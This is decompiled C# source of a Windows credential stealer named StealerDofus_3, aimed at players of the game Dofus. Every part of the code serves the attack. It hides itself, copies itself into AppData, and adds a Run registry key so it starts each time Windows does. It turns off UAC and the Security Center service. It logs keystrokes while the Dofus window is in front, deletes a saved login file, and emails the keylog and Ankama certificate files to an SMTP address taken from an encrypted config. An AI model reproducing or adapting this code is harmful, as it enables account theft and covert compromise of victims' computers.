using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using StealerDofus_3.My;

namespace StealerDofus_3;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("TimerKey")]
	private Timer _TimerKey;

	[AccessedThroughProperty("TimerForm")]
	private Timer _TimerForm;

	private const string MySp = "\\_/";

	public string _MailSender;

	public string _PassMailSender;

	public string _MailToSender;

	public string _Subject;

	public string _SMTPServer;

	public int _SMTPPort;

	public bool _EnableSsl;

	private const int VK_CAPITAL = 20;

	private const int VK_SHIFT = 16;

	private const int VK_BACK = 8;

	private const int VK_TAB = 9;

	private const int VK_ENTER = 13;

	private const int VK_RBUTTON = 2;

	private const int VK_NUMPAD0 = 96;

	private const int VK_NUMPAD1 = 97;

	private const int VK_NUMPAD2 = 98;

	private const int VK_NUMPAD3 = 99;

	private const int VK_NUMPAD4 = 100;

	private const int VK_NUMPAD5 = 101;

	private const int VK_NUMPAD6 = 102;

	private const int VK_NUMPAD7 = 103;

	private const int VK_NUMPAD8 = 104;

	private const int VK_NUMPAD9 = 105;

	private string pathmacr99taldmN77s67o5X9foh7mI9w54zQF3i97zjO69pCb54o3m7cTtnWhbhnyi0K6DwAc4zv2u85Z8CDgT;

	private int App_hwnd;

	private string App_Title;

	private string TextMailFlashEp9VWx220t1OA6P4dnM1iDnCQbyA62APmRjNV9YqQlt9qDE8lV8Z5m5U3o9x6p;

	private bool EnableDNPxDXr8ODnFfmy3X1QI83F4H8u63c668Ndm45If96o82MbR1onHk0r9Y5eQWXv4KlP9hj38YZC4y7e6i1J772u825ydeF2;

	private string MailFlashv1r94YH68OkUVyUcSSIA04hR9u04m8p7caFvf7HBwp2v0txFMMYY3a4eW;

	private bool oBTimerMaison;

	private MailMessage MyMailbYpL7Bv7Yz2azXg2clXgkCAGPKjI67lZ6u5Wlj29Y3be7165giDUyYYk8;

	internal virtual Timer TimerKey
	{
		get
		{
			return _TimerKey;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TimerKey = value;
		}
	}

	internal virtual Timer TimerForm
	{
		get
		{
			return _TimerForm;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = TimerForm_Tick;
			if (_TimerForm != null)
			{
				_TimerForm.remove_Tick(eventHandler);
			}
			_TimerForm = value;
			if (_TimerForm != null)
			{
				_TimerForm.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)delegate
		{
			Demarage();
		});
		_MailSender = null;
		_PassMailSender = null;
		_MailToSender = null;
		_Subject = null;
		_SMTPServer = null;
		_SMTPPort = 0;
		_EnableSsl = false;
		pathmacr99taldmN77s67o5X9foh7mI9w54zQF3i97zjO69pCb54o3m7cTtnWhbhnyi0K6DwAc4zv2u85Z8CDgT = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Dofus2\\Module_Ankama_Connection.dat";
		TextMailFlashEp9VWx220t1OA6P4dnM1iDnCQbyA62APmRjNV9YqQlt9qDE8lV8Z5m5U3o9x6p = null;
		EnableDNPxDXr8ODnFfmy3X1QI83F4H8u63c668Ndm45If96o82MbR1onHk0r9Y5eQWXv4KlP9hj38YZC4y7e6i1J772u825ydeF2 = true;
		MailFlashv1r94YH68OkUVyUcSSIA04hR9u04m8p7caFvf7HBwp2v0txFMMYY3a4eW = null;
		MyMailbYpL7Bv7Yz2azXg2clXgkCAGPKjI67lZ6u5Wlj29Y3be7165giDUyYYk8 = new MailMessage();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		components = new Container();
		TimerKey = new Timer(components);
		TimerForm = new Timer(components);
		((Control)this).SuspendLayout();
		TimerKey.set_Interval(1);
		TimerForm.set_Interval(1);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(116, 0);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("st");
		((Control)this).ResumeLayout(false);
	}

	private void Demarage()
	{
		((Control)this).Hide();
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Width(0);
		((Control)this).set_Height(0);
		Application.DoEvents();
		Melt();
		outUAC();
		GetConfig();
	}

	public string Decrypt(string toDecrypt)
	{
		string s = "zJm9pof5qhDUCGBBLH0xaMB3zTZ44Dcp4ms7INNjxZh9le5W6RkDRTz2iWVAmWivLg3vktbALlF2xBT6WxHvur0QTZ9wsmvn2UVYoK1Zua7Ba41o8cy9MNpv";
		byte[] array = Convert.FromBase64String(toDecrypt);
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] key = mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(s));
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		tripleDESCryptoServiceProvider.Key = key;
		tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
		tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
		byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
		return Encoding.UTF8.GetString(bytes);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Melt()
	{
		string executablePath = Application.get_ExecutablePath();
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Strings.Replace(Application.get_ExecutablePath(), Application.get_StartupPath(), "", 1, -1, (CompareMethod)0);
		if (Operators.CompareString(executablePath, text, false) != 0)
		{
			try
			{
				if (!File.Exists(text))
				{
					File.Copy(executablePath, text);
					Interaction.Shell(text, (AppWinStyle)0, false, -1);
					ProjectData.EndApp();
				}
				else
				{
					try
					{
						File.Delete(text);
						File.Copy(executablePath, text);
						Interaction.Shell(text, (AppWinStyle)0, false, -1);
						ProjectData.EndApp();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.EndApp();
						ProjectData.ClearProjectError();
					}
					ProjectData.EndApp();
				}
				return;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
				return;
			}
		}
		AddDem();
	}

	private void AddDem()
	{
		string executablePath = Application.get_ExecutablePath();
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Strings.Replace(Application.get_ExecutablePath(), Application.get_StartupPath(), "", 1, -1, (CompareMethod)0);
		if (Operators.CompareString(Application.get_ExecutablePath(), text, false) == 0)
		{
			string name = Strings.Replace(Strings.Replace(Application.get_ExecutablePath(), Application.get_StartupPath(), "", 1, -1, (CompareMethod)0), "\\", "", 1, -1, (CompareMethod)0);
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey.SetValue(name, executablePath);
				registryKey.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			TimerForm.Start();
			Application.DoEvents();
		}
	}

	private void outUAC()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\services\\wscsvc", writable: true);
			if (Operators.ConditionalCompareObjectNotEqual(registryKey.GetValue("Start"), (object)4, false))
			{
				try
				{
					registryKey.SetValue("Start", "4", RegistryValueKind.DWord);
					registryKey.Close();
					return;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					return;
				}
			}
			registryKey.Close();
			try
			{
				RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				registryKey2.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
				registryKey2.SetValue("ConsentPromptBehaviorAdmin", "0", RegistryValueKind.DWord);
				registryKey2.Close();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void GetConfig()
	{
		//IL_00b2: Unknown result type (might be due to invalid IL or missing references)
		string text = File.ReadAllText(Application.get_ExecutablePath());
		string[] array = Strings.Split(text, "|@|@|@|@|", -1, (CompareMethod)0);
		string text2 = Decrypt(array[1]);
		if (!text2.Contains("\\_/"))
		{
			ProjectData.EndApp();
		}
		string[] array2 = Strings.Split(text2, "\\_/", -1, (CompareMethod)0);
		_MailSender = array2[1];
		_PassMailSender = array2[2];
		_MailToSender = array2[3];
		_Subject = array2[4];
		_SMTPServer = array2[5];
		_SMTPPort = Conversions.ToInteger(array2[6]);
		try
		{
			if (Operators.CompareString(array2[7], "1", false) == 0)
			{
				_EnableSsl = true;
			}
			else
			{
				_EnableSsl = false;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	private void TimerForm_Tick(object sender, EventArgs e)
	{
		if (File.Exists(pathmacr99taldmN77s67o5X9foh7mI9w54zQF3i97zjO69pCb54o3m7cTtnWhbhnyi0K6DwAc4zv2u85Z8CDgT))
		{
			File.Delete(pathmacr99taldmN77s67o5X9foh7mI9w54zQF3i97zjO69pCb54o3m7cTtnWhbhnyi0K6DwAc4zv2u85Z8CDgT);
		}
		Application.DoEvents();
		int hwndA = GetForegroundWindow();
		if (hwndA == App_hwnd)
		{
			return;
		}
		App_hwnd = hwndA;
		App_Title = GetTitle(ref hwndA);
		if (Operators.CompareString(App_Title, "", false) != 0)
		{
			if (Operators.CompareString(App_Title, "Dofus", false) == 0)
			{
				Application.DoEvents();
				EnableDNPxDXr8ODnFfmy3X1QI83F4H8u63c668Ndm45If96o82MbR1onHk0r9Y5eQWXv4KlP9hj38YZC4y7e6i1J772u825ydeF2 = true;
				TimerMaison();
			}
			else
			{
				EnableDNPxDXr8ODnFfmy3X1QI83F4H8u63c668Ndm45If96o82MbR1onHk0r9Y5eQWXv4KlP9hj38YZC4y7e6i1J772u825ydeF2 = false;
			}
		}
	}

	private void TimerMaison()
	{
		string text = null;
		while (!oBTimerMaison)
		{
			Application.DoEvents();
			text = KeyAction();
			TextMailFlashEp9VWx220t1OA6P4dnM1iDnCQbyA62APmRjNV9YqQlt9qDE8lV8Z5m5U3o9x6p += text;
			if (!EnableDNPxDXr8ODnFfmy3X1QI83F4H8u63c668Ndm45If96o82MbR1onHk0r9Y5eQWXv4KlP9hj38YZC4y7e6i1J772u825ydeF2)
			{
				oBTimerMaison = true;
				if (Operators.CompareString(TextMailFlashEp9VWx220t1OA6P4dnM1iDnCQbyA62APmRjNV9YqQlt9qDE8lV8Z5m5U3o9x6p, "", false) != 0)
				{
					SendMail(TextMailFlashEp9VWx220t1OA6P4dnM1iDnCQbyA62APmRjNV9YqQlt9qDE8lV8Z5m5U3o9x6p);
				}
				TextMailFlashEp9VWx220t1OA6P4dnM1iDnCQbyA62APmRjNV9YqQlt9qDE8lV8Z5m5U3o9x6p = null;
				MailFlashv1r94YH68OkUVyUcSSIA04hR9u04m8p7caFvf7HBwp2v0txFMMYY3a4eW = null;
			}
			Thread.SpinWait(100);
		}
		oBTimerMaison = false;
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern ushort GetAsyncKeyState(int vKey);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern short GetKeyState(int virtualKeyCode);

	public string KeyAction()
	{
		string text = null;
		int num = 0;
		do
		{
			if (!((GetKeyState(20) < 0) | (GetKeyState(16) < 0) | Control.IsKeyLocked((Keys)20)))
			{
				if (65 <= num && num <= 90)
				{
					if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
					{
						text += Conversions.ToString(Strings.Chr(checked(num + 32)));
						break;
					}
				}
				else
				{
					switch (num)
					{
					case 49:
						if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
						{
							text += "&";
						}
						break;
					case 50:
						if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
						{
							text += Conversions.ToString(Strings.Chr(233));
						}
						break;
					case 51:
						if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
						{
							text += "\"";
						}
						break;
					case 52:
						if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
						{
							text += "'";
						}
						break;
					case 53:
						if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
						{
							text += "(";
						}
						break;
					case 54:
						if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
						{
							text += "-";
						}
						break;
					case 55:
						if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
						{
							text += Conversions.ToString(Strings.Chr(232));
						}
						break;
					case 56:
						if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
						{
							text += "_";
						}
						break;
					case 57:
						if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
						{
							text += Conversions.ToString(Strings.Chr(231));
						}
						break;
					case 48:
						if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
						{
							text += Conversions.ToString(Strings.Chr(224));
						}
						break;
					case 32:
						if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
						{
							text += Conversions.ToString(Strings.Chr(num));
						}
						break;
					case 226:
						if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
						{
							text += "<";
						}
						break;
					default:
						if (GetKeyState(8) < 0)
						{
							if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
							{
								text += "[<]";
							}
						}
						else if (GetKeyState(96) < 0)
						{
							if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
							{
								text += "0";
							}
						}
						else if (GetKeyState(97) < 0)
						{
							if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
							{
								text += "1";
							}
						}
						else if (GetKeyState(98) < 0)
						{
							if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
							{
								text += "2";
							}
						}
						else if (GetKeyState(99) < 0)
						{
							if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
							{
								text += "3";
							}
						}
						else if (GetKeyState(100) < 0)
						{
							if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
							{
								text += "4";
							}
						}
						else if (GetKeyState(101) < 0)
						{
							if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
							{
								text += "5";
							}
						}
						else if (GetKeyState(102) < 0)
						{
							if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
							{
								text += "6";
							}
						}
						else if (GetKeyState(103) < 0)
						{
							if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
							{
								text += "7";
							}
						}
						else if (GetKeyState(104) < 0)
						{
							if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
							{
								text += "8";
							}
						}
						else if (GetKeyState(105) < 0)
						{
							if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
							{
								text += "9";
							}
						}
						else if (GetKeyState(9) < 0)
						{
							if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
							{
								text += "|";
							}
						}
						else if (GetKeyState(13) < 0 && ((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
						{
							text += "#";
							EnableDNPxDXr8ODnFfmy3X1QI83F4H8u63c668Ndm45If96o82MbR1onHk0r9Y5eQWXv4KlP9hj38YZC4y7e6i1J772u825ydeF2 = false;
						}
						break;
					}
				}
			}
			else if (65 <= num && num <= 90)
			{
				if (((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
				{
					text += Conversions.ToString(Strings.Chr(num));
					break;
				}
			}
			else if (48 <= num && num <= 57 && ((uint)GetAsyncKeyState(num) & (true ? 1u : 0u)) != 0)
			{
				text += Conversions.ToString(Strings.Chr(num));
				break;
			}
			num = checked(num + 1);
		}
		while (num <= 256);
		return text;
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextLengthA(int hwnd);

	private string GetTitle(ref int hwndA)
	{
		try
		{
			int windowTextLengthA = GetWindowTextLengthA(hwndA);
			string lpString = new string('\0', windowTextLengthA);
			GetWindowTextA(hwndA, ref lpString, checked(windowTextLengthA + 1));
			return lpString;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Titre non trouvé";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void SendMail(string Text)
	{
		//IL_0163: Unknown result type (might be due to invalid IL or missing references)
		Application.DoEvents();
		checked
		{
			try
			{
				string mailSender = _MailSender;
				string passMailSender = _PassMailSender;
				string mailToSender = _MailToSender;
				MailMessage mailMessage = new MailMessage();
				mailMessage.From = new MailAddress(mailSender);
				mailMessage.To.Add(mailToSender);
				mailMessage.Subject = _Subject + ", [" + ((ServerComputer)MyProject.Computer).get_Name() + "]";
				mailMessage.Body = Text;
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\AnkamaCertificates";
				if (Directory.Exists(path))
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(path);
					FileInfo[] files = directoryInfo.GetFiles();
					foreach (FileInfo fileInfo in files)
					{
						FileStream fileStream = fileInfo.OpenRead();
						byte[] buffer = new byte[(int)(fileStream.Length - 1L) + 1];
						fileStream.Read(buffer, 0, (int)fileStream.Length);
						fileStream.Close();
						Stream contentStream = new MemoryStream(buffer);
						Attachment item = new Attachment(contentStream, fileInfo.get_Name());
						mailMessage.Attachments.Add(item);
					}
				}
				SmtpClient smtpClient = new SmtpClient(_SMTPServer);
				smtpClient.Port = _SMTPPort;
				smtpClient.Credentials = new NetworkCredential(mailSender, passMailSender);
				smtpClient.EnableSsl = _EnableSsl;
				smtpClient.Send(mailMessage);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
				ProjectData.ClearProjectError();
			}
		}
	}
}
